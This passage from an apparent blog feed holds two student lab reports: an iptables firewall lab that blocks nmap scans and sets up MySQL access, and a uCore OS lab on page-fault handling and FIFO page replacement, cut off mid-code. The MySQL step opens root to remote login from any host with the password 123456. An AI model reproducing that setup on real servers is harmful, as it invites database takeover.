<p>20、验证：打开Web服务器，在终端中输入命令：mysql –uroot –p（密码为123456），连接成功。如图20所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414142707850.png" alt="image-20200414142707850"></p>
<p>21、打开NAT服务器，增加iptables规则，禁止对该主机进行nmap扫描。输入命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --tcp-flag ALL FIN,URG,PSH -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flag SYN,RST SYN,RST -j DROP </span><br><span class="line">iptables -A INPUT -p tcp --tcp-flag SYN,FIN SYN,FIN -j DROP </span><br><span class="line">iptables -I INPUT -s 192.168.20.20 -j DROP</span><br><span class="line">//禁止nmap扫描</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables –L</span><br></pre></td></tr></table></figure></div>
<p>如图所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414150602258.png" alt="image-20200414150602258"></p>
<p>22、验证：在Windows攻击机上，打开命令行界面，输入命令：nmap -A 192.168.10.10（NAT服务器IP），扫描NAT服务器，扫描失败。如图22所示：</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414160448916.png" alt="image-20200414160448916"></p>
<p>可以发现只扫出了8080端口的开放信息，这是因为NAT服务器的8080端口开放为Web服务器设置转发。</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414161540279.png" alt="image-20200414161540279"></p>
<p>对比NAT服务器的开放端口，可知iptables设置成功，nmap失效</p>
<h1 id="【实验思考】"><a href="#【实验思考】" class="headerlink" title="【实验思考】"></a>【实验思考】</h1><p>1、在上述实验中，配置禁止ICMP策略后将达到什么效果，配置NAT代理有什么好处？若缺少这一步可能会存在什么安全威胁？</p>
<p>答：</p>
<p>（1）主机配置禁止ICMP策略后无法其他及其无法对该主机进行正常的ping回应</p>
<p>（2）对外隐藏了内部管理的IP地址和隐藏了内部网络结构，从而降低了内部网络受到攻击的风险。</p>
<p>（3）(内网)主机可能会遭受DDos攻击、暴力破解等攻击。</p>
<p>2、在配置的端口映射的规则中PREROUTING、和POSTROUTING分别表示是什么样的一个动作？</p>
<p>（1）PREROUTING是目的地址转换，对象是由外部公网发往内网的数据包，把外来的公网IP换成自建内部网络的IP，才可访问到自建内部网络受防火墙保护的机器。</p>
<p>（2）POSTROUTING是源地址转换，对象是由内网发往外部公网的数据包，把自建内网地址转换成外部公网地址再向外发送。</p>
<h1 id="【扩展实验】"><a href="#【扩展实验】" class="headerlink" title="【扩展实验】"></a>【扩展实验】</h1><p>请学员课后完成以下扩展实验，并提交实验报告：</p>
<p>若对指定<strong>IP</strong>：<strong>192.168.1.101</strong>解除防火墙限制，执行该条配置命令：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -s 192.168.1.101 --dport 3306 -j ACCEPT</span><br></pre></td></tr></table></figure></div>
<p>保存重启后发现还是无法远程连接<strong>3306</strong>，原因是什么，正确配置是什么？</p>
<p>按照如上设置后进入linux客户端登陆mysql</p>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414170726946.png" alt="image-20200414170726946"></p>
<p>远程访问出现not allowed的提示消息，说明远程用户无权限，因此需要修改服务器的mysql用户表</p>
<p>进入Web服务器</p>
<p>查看sql</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure></div>
<p>输入sql语句</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; use select host,user,password from user;</span><br></pre></td></tr></table></figure>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414183459151.png" alt="image-20200414183459151"></p>
<p>可以看出root账户只允许在本地登陆</p>
<p>设置root账户可以远程登录</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">mysql&gt;update user set host='%' where user='root' and host='localhost';</span><br><span class="line">mysql&gt;flush privilegses;</span><br></pre></td></tr></table></figure>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414184123331.png" alt="image-20200414184123331"></p>
<p>成功更改host地址，<code>host=&#39;%&#39;</code>表示所有机器。</p>
<p>切换至linux客户端（192.168.1.102）</p>
<p>登陆服务器sql</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -h 192.168.1.101 -p123456</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/2f12bf9c/image-20200414184347549.png" alt="image-20200414184347549"></p>
<p>成功远程登陆mysql </p>
]]></content>
      <categories>
        <category>信息安全学习</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>uCoreOs lab3 实验报告</title>
    <url>/posts/69d005/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>了解虚拟内存的Page Fault异常处理实现</li>
<li>了解页替换算法在操作系统中的实现<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><h2 id="练习介绍"><a href="#练习介绍" class="headerlink" title="练习介绍"></a>练习介绍</h2><p>​        本次实验是在实验二的基础上，借助于页表机制和实验一中涉及的中断异常处理机制，完成Page Fault异常处理和FIFO页替换算法的实现，结合磁盘提供的缓存空间，从而能够支持虚存管理，提供一个比实际物理内存空间“更大”的虚拟内存空间给系统使用。这个实验与实际操作系统中的实现比较起来要简单，不过需要了解实验一和实验二的具体实现。实际操作系统系统中的虚拟内存管理设计与实现是相当复杂的，涉及到与进程管理系统、文件系统等的交叉访问。如果大家有余力，可以尝试完成扩展练习，实现extended　clock页替换算法。</p>
<h2 id="虚存管理介绍"><a href="#虚存管理介绍" class="headerlink" title="虚存管理介绍"></a>虚存管理介绍</h2><ul>
<li><p>内存地址虚拟化能有效隔离不同进程的内存访问空间：在有了分页机制后，程序员或CPU“看到”的地址已经不是实际的物理地址了，这已经有一层虚拟化，我们可简称为内存地址虚拟化。有了内存地址虚拟化，我们就可以通过设置页表项来限定软件运行时的访问空间，确保软件运行不越界，完成内存访问保护的功能。</p>
</li>
<li><p>内存地址虚拟化能提供更大的内存“空间”：</p>
<ul>
<li>按需分页：通过内存地址虚拟化，可以使得软件在没有访问某虚拟内存地址时不分配具体的物理内存，而只有在实际访问某虚拟内存地址时，操作系统再动态地分配物理内存，建立虚拟内存到物理内存的页映射关系，这种技术称为按需分页（demand paging） 。</li>
<li>页换入换出：把不经常访问的数据所占的内存空间临时写到硬盘上，这样可以腾出更多的空闲内存空间给经常访问的数据；当CPU访问到不经常访问的数据时，再把这些数据从硬盘读入到内存中，这种技术称为页换入换出（page swap in/out） 。这种内存管理技术给了程序员更大的内存“空间”，从而可以让更多的程序在内存中并发运行。</li>
</ul>
</li>
</ul>
<h2 id="虚存管理总体框架"><a href="#虚存管理总体框架" class="headerlink" title="虚存管理总体框架"></a>虚存管理总体框架</h2><p>​    1.<strong>完成初始化虚拟内存管理机制：IDE 硬盘读写，缺页异常处理</strong></p>
<p>​    2.<strong>设置虚拟页空间和物理页帧空间，表述不在物理内存中的“合法”虚拟页</strong></p>
<p>​    3.<strong>完善建立页表映射、页访问异常处理操作等函数实现</strong></p>
<p>​    4.<strong>执行访存测试，查看建立的页表项是否能够正确完成虚实地址映射</strong></p>
<p>​    5.<strong>执行访存测试，查看是否正确描述了虚拟内存页在物理内存中还是在硬盘上</strong></p>
<p>​    6.<strong>执行访存测试，查看是否能够正确把虚拟内存页在物理内存和硬盘之间进行传递</strong></p>
<p>​    7.<strong>执行访存测试，查看是否正确实现了页面替换算法等</strong></p>
<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1/2。请把你做的实验1/2的代码填入本实验中代码中有“LAB1”,“LAB2”的注释相应部分。</p>
<p>用meld工具比较两个文件夹的差异</p>
<p>只需对<code>kdebug.c、trap.c、default_pmm.c、pmm.c</code>四个文件进行相应补充即可</p>
<h2 id="练习1：给未被映射的地址映射上物理页"><a href="#练习1：给未被映射的地址映射上物理页" class="headerlink" title="练习1：给未被映射的地址映射上物理页"></a>练习1：给未被映射的地址映射上物理页</h2><p>完成do_pgfault（mm/vmm.c）函数，给未被映射的地址映射上物理页。设置访问权限 的时候需要参考页面所在 VMA 的权限，同时需要注意映射物理页时需要操作内存控制 结构所指定的页表，而不是内核的页表。注意：在LAB3 EXERCISE 1处填写代码。执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">make　qemu</span><br></pre></td></tr></table></figure></div>
<p>后，如果通过check_pgfault函数的测试后，会有“check_pgfault() succeeded!”的输出，表示练习1基本正确。</p>
<p>请在实验报告中简要说明你的设计实现过程。请回答如下问题：</p>
<ul>
<li>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中组成部分对ucore实现页替换算法的潜在用处。</li>
<li>如果ucore的缺页服务例程在执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</li>
</ul>
<h3 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h3><p>查看init.c函数</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200409204157428.png" alt="image-20200409204157428"></p>
<p>可以看出虚拟内存初始化前便进行了物理内存初始化</p>
<p>查看vmm.h相关结构体内容：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span> <span class="comment">// 描述一个进程的虚拟地址空间 每个进程的 pcb 中 会有一个指针指向本结构体</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list;        <span class="comment">// 链接同一页目录表的虚拟内存空间 的 双向链表的 头节点 </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span> <span class="comment">// 当前正在使用的虚拟内存空间</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir;                  <span class="comment">// mm_struct 所维护的页表地址(拿来找 PTE)</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                 <span class="comment">// 虚拟内存块的数目</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv;                 <span class="comment">// 记录访问情况链表头地址(用于置换算法)</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> &#123;</span> <span class="comment">// 虚拟内存空间</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">// 虚拟内存空间属于的进程</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start; <span class="comment">// 连续地址的虚拟内存空间的起始位置和结束位置</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end;</span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags; <span class="comment">// 虚拟内存空间的属性 (读/写/执行)</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link; <span class="comment">// 双向链表 从小到大将虚拟内存空间链接起来</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//vm_flags：该虚拟内存空间的属性，目前的属性包括可读、可写、可执行；</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VM_READ                 0x00000001  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VM_WRITE                0x00000002  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> VM_EXEC                 0x00000004  </span></span><br><span class="line"><span class="comment">//可以看出来三个权限是在uint32的后三位上。</span></span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/69d005/mm_vma.png" alt="mm_vma"></p>
<p>其中mm_struct 描述了整个进程的虚拟地址空间，而 vma_struct 描述了进程中的一小部分虚拟内存空间</p>
<p>查看提示</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200409230159885.png" alt="image-20200409230159885"></p>
<p>根据提示填入代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>); <span class="comment">// 根据引发缺页异常的地址 去找到 地址所对应的 PTE 如果找不到 则创建一页表</span></span><br><span class="line"><span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123; <span class="comment">// PTE 所指向的 物理页表地址 若不存在 则分配一物理页并将逻辑地址和物理地址作映射 (就是让 PTE 指向 物理页帧)</span></span><br><span class="line">    <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>make qemu</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200409235404911.png" alt="image-20200409235404911"></p>
<p>显示成功，但check_swap()错误，出现了缺页错误</p>
<h3 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h3><p>本练习问题和lab2的练习2完全一致</p>
<blockquote>
<p>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中每个组成部分的含义以及对ucore而言的潜在用处。</p>
</blockquote>
<p><img src="/images/loading.gif" data-original="/posts/69d005/Page_dir.png" alt="PDE 详解"></p>
<p>从低到高，分别是：</p>
<ul>
<li><em>P</em> (Present) 位：表示该页保存在物理内存中。</li>
<li><em>R</em> (Read/Write) 位：表示该页可读可写。</li>
<li><em>U</em> (User) 位：表示该页可以被任何权限用户访问。</li>
<li><em>W</em> (Write Through) 位：表示 CPU 可以直写回内存。</li>
<li><em>D</em> (Cache Disable) 位：表示不需要被 CPU 缓存。</li>
<li><em>A</em> (Access) 位：表示该页被访问过。</li>
<li><em>S</em> (Size) 位：表示一个页 4MB 。</li>
<li>9-11 位保留给 OS 使用。</li>
<li>12-31 位指明 PTE 基质地址。</li>
</ul>
<p><img src="/images/loading.gif" data-original="/posts/69d005/Page_table-1585330806618.png" alt="PTE 详解"></p>
<p>从低到高，分别是：</p>
<ul>
<li>0-3 位同 PDE。</li>
<li><em>C</em> (Cache Disable) 位：同 PDE <em>D</em> 位。</li>
<li><em>A</em> (Access) 位：同 PDE 。</li>
<li><em>D</em> (Dirty) 位：表示该页被写过。</li>
<li><em>G</em> (Global) 位：表示在 CR3 寄存器更新时无需刷新 TLB 中关于该页的地址。</li>
<li>9-11 位保留给 OS 使用。</li>
<li>12-31 位指明物理页基址。</li>
</ul>
<blockquote>
<p>如果ucore执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？</p>
</blockquote>
<p><strong>使能页机制</strong>：</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200328093548814.png" alt="image-20200328093548814"></p>
<p><strong>Cr0系列的控制寄存器：</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>寄存器名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>CR0</td>
<td>包含处理器标志控制位，如PE,PG,WP等</td>
</tr>
<tr>
<td>CR1</td>
<td>保留</td>
</tr>
<tr>
<td>CR2</td>
<td>专门用于保存缺页异常时的线性地址</td>
</tr>
<tr>
<td>CR3</td>
<td>保存进程页目录地址</td>
</tr>
<tr>
<td>CR4</td>
<td>扩展功能（如判断物理地址扩展模式等），Pentium系列(包括486的后期版本)处理器中才实现</td>
</tr>
</tbody>
</table>
</div>
<p>如果出现了页访问异常，那么硬件将引发页访问异常的地址将被保存在cr2寄存器中，设置错误代码，然后触发Page Fault异常。</p>
<p>下图为页访问异常的各种情况：</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410020310883.png" alt="image-20200410020310883"></p>
<p>页访问异常（Page Fault）</p>
<ul>
<li>在程序的执行过程中由于某种原因（页框不存在/写只读页等） 而使 CPU 无法最终访问到相应的物理内存单元，即无法完成从虚拟地址到物理地址映射时，CPU 会产生一次页访问异常，从而需要进行相应的页访问异常的中断服务例程。这个页访问异常处理的时机被操作系统充分利用来完成虚存管理，即实现“按需调页”/“页换入换出”处理的执行时机。当相关处理完成后，页访问异常服务例程会返回到产生异常的指令处重新执行，使得应用软件可以继续正常运行下去。</li>
<li>具体而言，当启动分页机制以后，如果一条指令或数据的虚拟地址所对应的物理页框不在内存中或者访问的类型有错误（比如写一个只读页或用户态程序访问内核态的数据等） ，就会发生页访问异常。产生页访问异常的原因主要有：<ul>
<li>目标页帧不存在（页表项全为0，即该线性地址与物理地址尚未建立映射或者已经撤销)</li>
<li>相应的物理页帧不在内存中（页表项非空，但Present标志位=0，比如在swap分区或磁盘文件上)</li>
<li>不满足访问权限(此时页表项P标志=1，但低权限的程序试图访问高权限的地址空间，或者有程序试图写只读页面)</li>
</ul>
</li>
<li>CPU会把产生异常的线性地址存储在CR2中，并且把表示页访问异常类型的值（简称页访问异常错误码，errorCode）保存在中断栈中。页访问异常错误码有32位。位0为1表示对应物理页不存在；位1为1表示写异常（比如写了只读页）；位2为1表示访问权限异常（比如用户态程序访问内核空间的数据）</li>
<li>CR2是页故障线性地址寄存器，保存最后一次出现页故障的全32位线性地址。CR2用于发生页异常时报告出错信息。当发生页异常时，处理器把引起页异常的线性地址保存在CR2中。操作系统中对应的中断服务例程可以检查CR2的内容，从而查出线性地址空间中的哪个页引起本次异常。</li>
</ul>
<h2 id="练习2：补充完成基于FIFO的页面替换算法"><a href="#练习2：补充完成基于FIFO的页面替换算法" class="headerlink" title="练习2：补充完成基于FIFO的页面替换算法"></a>练习2：补充完成基于FIFO的页面替换算法</h2><p>完成vmm.c中的do_pgfault函数，并且在实现FIFO算法的swap_fifo.c中完成map_swappable和swap_out_victim函数。通过对swap的测试。注意：在LAB3 EXERCISE 2处填写代码。执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="code"><pre><span class="line">make　qemu</span><br></pre></td></tr></table></figure></div>
<p>后，如果通过check_swap函数的测试后，会有“check_swap() succeeded!”的输出，表示练习2基本正确。</p>
<p>请在实验报告中简要说明你的设计实现过程。</p>
<p>请在实验报告中回答如下问题：</p>
<ul>
<li>如果要在ucore上实现”extended clock页替换算法”请给你的设计方案，现有的swap_manager框架是否足以支持在ucore中实现此算法？如果是，请给你的设计方案。如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题<ul>
<li>需要被换出的页的特征是什么？</li>
<li>在ucore中如何判断具有这样特征的页？</li>
<li>何时进行换入和换出操作？</li>
</ul>
</li>
</ul>
<h3 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h3><p>查看vmm.c中lab2注释</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410001251895.png" alt="image-20200410001251895"></p>
<p>根据注释写代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123; <span class="comment">// 如果 PTE 存在 说明此时 P 位为 0 该页被换出到外存中 需要将其换入内存</span></span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) &#123; <span class="comment">// 是否可以换入页面</span></span><br><span class="line">            struct Page *page = <span class="literal">NULL</span>;</span><br><span class="line">            ret = swap_in(mm, addr, &amp;page); <span class="comment">// 根据 PTE 找到 换出那页所在的硬盘地址 并将其从外存中换入</span></span><br><span class="line">            <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">                cprintf(<span class="string">"swap_in in do_pgfault failed\n"</span>);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            &#125;</span><br><span class="line">            page_insert(mm-&gt;pgdir, page, addr, perm); <span class="comment">// 建立虚拟地址和物理地址之间的对应关系(更新 PTE 因为 已经被换入到内存中了)</span></span><br><span class="line">            swap_map_swappable(mm, addr, page, <span class="number">0</span>); <span class="comment">// 使这一页可以置换</span></span><br><span class="line">            page-&gt;pra_vaddr = addr; <span class="comment">// 设置 这一页的虚拟地址</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cprintf(<span class="string">"no swap_init_ok but ptep is %x, failed\n"</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>查看swap_fifo.c注释</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410001111541.png" alt="image-20200410001111541"></p>
<p>根据注释写代码</p>
<p>此时完成的是 FIFO 置换算法，因此每次换出的都应该是最先进来的 页</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line">static int _fifo_map_swappable(struct mm_struct *mm, uintptr_t addr, struct Page *page, int swap_in) &#123;</span><br><span class="line">    list_entry_t *head=(list_entry_t*) mm-&gt;sm_priv;</span><br><span class="line">    list_entry_t *entry=&amp;(page-&gt;pra_page_link);</span><br><span class="line"></span><br><span class="line">    assert(entry != NULL &amp;&amp; head != NULL);</span><br><span class="line"></span><br><span class="line"><span class="addition">+   list_add(head, entry); // 就是将这一页加入到链表头中(最近访问过的放前面) 使其可以被置换算法使用到</span></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int _fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, int in_tick) &#123;</span><br><span class="line">    list_entry_t *head=(list_entry_t*) mm-&gt;sm_priv;</span><br><span class="line">    assert(head != NULL);</span><br><span class="line">    assert(in_tick==0);</span><br><span class="line"></span><br><span class="line"><span class="addition">+   list_entry_t *le = head-&gt;prev; // 换出最先进来的页 (因为每次访问一个页 都是插入到头节点的后面 因此 头节点的前面就是最先访问的页)</span></span><br><span class="line"><span class="addition">+   struct Page* page = le2page(le, pra_page_link); // 和之前一样 通过 le 这个链表节点的地址 减去 pra_page_link 在 Page 结构体中的 Offset 得到 Page 的地址</span></span><br><span class="line"><span class="addition">+   list_del(le); // 删掉这个节点</span></span><br><span class="line"><span class="addition">+   *ptr_page = page; // 将这一页地址存到 ptr_page 中 给 调用本函数的函数使用</span></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>重新make qemu，得到下面的结果</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410010706159.png" alt="image-20200410010706159"></p>
<p>make grade</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410030434318.png" alt="image-20200410030434318"></p>
<p>成功运行</p>
<p>观察FIFO的check函数的对应关系</p>
<p><img src="/images/loading.gif" data-original="/posts/69d005/image-20200410135030537.png" alt="image-20200410135030537"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">swap.c</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">check_content_set(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">1</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1010</span> = <span class="number">0x0a</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">1</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">2</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2010</span> = <span class="number">0x0b</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">2</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">3</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3010</span> = <span class="number">0x0c</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">3</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">     *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4010</span> = <span class="number">0x0d</span>;</span><br><span class="line">     assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">swap_fifo.c</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_check_swap(<span class="keyword">void</span>) &#123;</span><br><span class="line">    cprintf(<span class="string">"write Virt Page c in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page a in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page d in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page b in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">4</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page e in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x5000</span> = <span class="number">0x0e</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page b in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">5</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page a in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x1000</span> = <span class="number">0x0a</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">6</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page b in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x2000</span> = <span class="number">0x0b</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">7</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page c in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x3000</span> = <span class="number">0x0c</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">8</span>);</span><br><span class="line">    cprintf(<span class="string">"write Virt Page d in fifo_check_swap\n"</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)<span class="number">0x4000</span> = <span class="number">0x0d</span>;</span><br><span class="line">    assert(pgfault_num==<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">return</span> <span 